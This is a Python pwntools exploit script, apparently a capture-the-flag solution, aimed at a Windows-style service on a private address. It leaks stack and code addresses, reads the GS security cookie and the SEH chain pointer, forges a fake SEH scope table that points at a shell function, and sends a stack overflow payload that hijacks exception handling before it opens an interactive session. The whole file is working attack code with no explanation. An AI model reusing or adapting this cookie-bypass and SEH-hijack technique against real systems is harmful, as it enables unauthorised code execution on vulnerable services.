from pwn import *
if args['DEBUG']:
    context.log_level = "debug"

conn = remote("192.168.234.1", 10009)

conn.recvuntil("stack address = ")
leak_stack = int(conn.recvuntil("\r\n", drop=True),16)
print '[stack]: ' + hex(leak_stack)
conn.recvuntil("main address = ")
leak_main = int(conn.recvuntil("\r\n", drop=True), 16)
print '[main]: ' + hex(leak_main)

ebp = leak_stack + 0x9c
cookie_addr = leak_main + (0x404004-0x4010b0)

fs_0_addr = leak_stack + 0x9c - 0x10 #ebp-0x10
handler = leak_stack + 0x9c - 0xc #ebp-0xc

#leak info
conn.sendlineafter("more?\r\n", "yes")
conn.sendlineafter("know\r\n", str(cookie_addr))
conn.recvuntil("value is ")
cookie_val = int(conn.recvuntil("\r\n", drop=True),16)
print '[cookie]: ' + hex(cookie_val)

conn.sendlineafter("more?\r\n", "yes")
conn.sendlineafter("know\r\n", str(fs_0_addr))
conn.recvuntil("value is ")
fs_0_val = int(conn.recvuntil("\r\n", drop=True), 16)
print '[fs_0]: ' + hex(fs_0_val)

#fake scope_table
shell_addr = leak_main + (0x40138d - 0x4010b0)
fake_scope_table = p32(0xFFFFFFE4) #GSCookieOffset
fake_scope_table += p32(0) #GSCookieXOROffset
fake_scope_table += p32(0xFFFFFF20) #EHCookieOffset
fake_scope_table += p32(0) #EHCookieXOROffset
fake_scope_table += p32(0xFFFFFFFE) #ScopeRecord.EnclosingLevel
fake_scope_table += p32(shell_addr) #ScopeRecord.FilterFunc
fake_scope_table += p32(shell_addr) #ScopeRecord.HandlerFunc

#first 4*'a' as padding
payload = 'a'*4 + fake_scope_table.ljust(0x80-4, '\x00') + p32(ebp ^ cookie_val) + 'a'*8 + p32(fs_0_val) + p32(leak_main+0x401460-0x4010b0) + p32((leak_stack+4)^cookie_val)+p32(0)
conn.sendlineafter("more?\r\n", 'djr')
conn.sendline(payload)

conn.sendlineafter("more?\r\n", 'yes')
conn.sendlineafter("know\r\n", str(0))

conn.interactive()
